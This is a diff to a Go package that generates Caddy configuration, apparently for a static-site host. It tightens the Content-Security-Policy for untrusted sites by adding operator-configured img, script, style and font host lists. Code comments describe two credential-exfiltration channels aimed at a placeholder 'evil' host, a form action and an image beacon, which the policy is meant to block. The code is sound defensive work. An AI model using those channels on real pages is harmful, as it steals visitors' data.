@@ -3,6 +3,8 @@ package caddygen
 import (
 	"fmt"
 	"strings"
+
+	"github.com/ittrail/sitebin.io/internal/config"
 )
 
 // cspReportPath is where violation reports go. It lives under /_sitebin/, which
@@ -37,9 +39,28 @@ const baselineCSP = `object-src 'none'; base-uri 'self'`
 // form-action is its own directive because connect-src does NOT cover form
 // submissions. Without it, <form action="https://evil"> stays wide open, which
 // is the oldest credential-exfiltration trick there is.
-const untrustedCSP = baselineCSP +
-	`; form-action 'none'; connect-src 'self'; frame-ancestors 'none'; frame-src 'none'` +
-	`; report-uri ` + cspReportPath + `; report-to csp`
+//
+// img-src closes the image beacon (new Image().src = "https://evil/?p=…"),
+// the channel the first version left open; script-src, style-src and font-src
+// name the CDNs a page may load code and fonts from, so third-party widgets,
+// trackers and IPFS-hosted kits stay off drops and free sites. The host lists
+// are the operator's (SITEBIN_CSP_*_HOSTS); the keywords are not.
+// 'unsafe-inline' and 'unsafe-eval' stay: nearly every static site inlines a
+// script, and what matters here is which hosts a page pulls code from. See
+// docs/superpowers/specs/2026-09-29-provenance-csp-apex.md.
+func untrustedCSP(cfg config.Config) string {
+	src := func(directive string, keywords string, hosts []string) string {
+		return "; " + strings.TrimSpace(directive+" "+keywords+" "+strings.Join(hosts, " "))
+	}
+	return baselineCSP +
+		`; form-action 'none'; connect-src 'self'; frame-ancestors 'none'; frame-src 'none'` +
+		src("img-src", "'self' data: blob:", cfg.CSPImgHosts) +
+		src("script-src", "'self' 'unsafe-inline' 'unsafe-eval'", cfg.CSPScriptHosts) +
+		src("style-src", "'self' 'unsafe-inline'", cfg.CSPStyleHosts) +
+		src("font-src", "'self' data:", cfg.CSPFontHosts) +
+		`; media-src 'self' data: blob:; worker-src 'self' blob:; manifest-src 'self'` +
+		`; report-uri ` + cspReportPath + `; report-to csp`
+}
 
 const permissionsPolicy = `geolocation=(), camera=(), microphone=(), payment=(), usb=(), midi=()`
 
@@ -49,13 +70,13 @@ const permissionsPolicy = `geolocation=(), camera=(), microphone=(), payment=(),
 //
 // It must come after `root`, because the trust matcher is a file test resolved
 // against the site root.
-func writeSecurityHeaders(b *strings.Builder, ind string) {
+func writeSecurityHeaders(b *strings.Builder, ind, untrusted string) {
 	// Keyed on the ABSENCE of the trust marker. That polarity is the point: a
 	// marker that was never written, or was lost in a restore, leaves a site
 	// served too strictly — never unprotected.
 	fmt.Fprintf(b, "%s@untrusted not file /%s\n", ind, trustedMarkerName)
 	fmt.Fprintf(b, "%sheader @untrusted {\n", ind)
-	writeCommonHeaders(b, ind+"\t", "no-referrer", untrustedCSP)
+	writeCommonHeaders(b, ind+"\t", "no-referrer", untrusted)
 	fmt.Fprintf(b, "%s\tReporting-Endpoints %q\n", ind, `csp="`+cspReportPath+`"`)
 	fmt.Fprintf(b, "%s}\n", ind)
 
